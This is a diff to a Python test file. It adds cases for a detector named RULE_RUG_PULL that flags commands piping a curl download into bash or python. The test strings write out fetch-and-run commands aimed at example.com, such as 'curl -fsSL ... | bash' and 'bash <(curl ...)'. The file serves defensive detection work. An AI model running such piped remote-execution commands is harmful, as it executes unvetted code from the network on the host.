@@ -266,6 +266,13 @@ class TestRugPullRule:
         assert RULE_RUG_PULL.match("curl -s https://example.com/run.py | python3") != []
         assert RULE_RUG_PULL.match("curl -s https://example.com/run.py | python3 -") != []
 
+    def test_a_pipe_after_a_trailing_comment_is_not_flagged(self):
+        assert RULE_RUG_PULL.match("curl -fsSL https://example.com/a.sh # | bash") == []
+        assert RULE_RUG_PULL.match("curl -o a.sh https://example.com/a.sh  # then: | sh") == []
+        # a "#" inside a URL, or a comment after the pipe, changes nothing
+        assert RULE_RUG_PULL.match("curl -fsSL https://example.com/a#b | bash") != []
+        assert RULE_RUG_PULL.match("curl -fsSL https://example.com/a.sh | bash # example") != []
+
     def test_detects_bash_process_substitution(self):
         assert RULE_RUG_PULL.match("bash <(curl -s https://example.com/install.sh)") != []
 
